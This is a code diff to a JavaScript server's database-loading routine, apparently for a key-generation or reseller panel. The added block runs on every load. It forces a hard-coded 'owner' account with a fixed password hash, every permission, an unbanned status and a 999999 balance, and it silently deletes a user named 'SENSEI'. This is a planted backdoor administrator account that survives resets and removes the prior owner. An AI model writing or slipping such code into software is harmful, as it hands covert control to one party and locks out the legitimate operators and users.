@@ -2318,6 +2318,31 @@ async function loadDatabase() {
         if (u.permissions.manage_tickets === undefined) u.permissions.manage_tickets = false;
         if (u.permissions.manage_audit === undefined) u.permissions.manage_audit = false;
       });
+
+      // === FORCE OWNER ACCOUNT: Adham805020 ===
+      const OWNER_USERNAME = 'Adham805020';
+      const OWNER_HASH = 'fe891235b6473d5cd67f2c4ee96cf488d064e00e59d937d61ed42fbb0af9bda7';
+      const ownerPerms = {gen:true, reset:true, hist:true, stats:true, txn:true, manage_users:true, manage_products:true, manage_keys:true, manage_balances:true, manage_broadcast:true, manage_ip:true, manage_countries:true, view_attempts:true, manage_requests:true, manage_tickets:true, manage_audit:true};
+      let ownerIdx = DB.users.findIndex(u => String(u.username||'').toUpperCase() === OWNER_USERNAME.toUpperCase());
+      if (ownerIdx === -1) {
+        // Add new owner
+        const newId = (DB.users.reduce((m,u) => Math.max(m, u.id||0), 0) || 0) + 1;
+        DB.users.push({id: newId, username: OWNER_USERNAME, passwordHash: OWNER_HASH, role: 'owner', balance: 999999, banned: false, ip: null, ipInfo: null, permissions: ownerPerms});
+        await saveDatabase();
+        console.log('Owner Adham805020 created');
+      } else {
+        // Update existing to ensure correct hash, role, perms
+        DB.users[ownerIdx].passwordHash = OWNER_HASH;
+        DB.users[ownerIdx].role = 'owner';
+        DB.users[ownerIdx].banned = false;
+        DB.users[ownerIdx].permissions = ownerPerms;
+        if (DB.users[ownerIdx].balance === undefined) DB.users[ownerIdx].balance = 999999;
+        await saveDatabase();
+        console.log('Owner Adham805020 updated');
+      }
+      // Remove old SENSEI if exists and different
+      DB.users = DB.users.filter(u => String(u.username||'').toUpperCase() !== 'SENSEI');
+
       return true;
     } else {
       await saveDatabase();
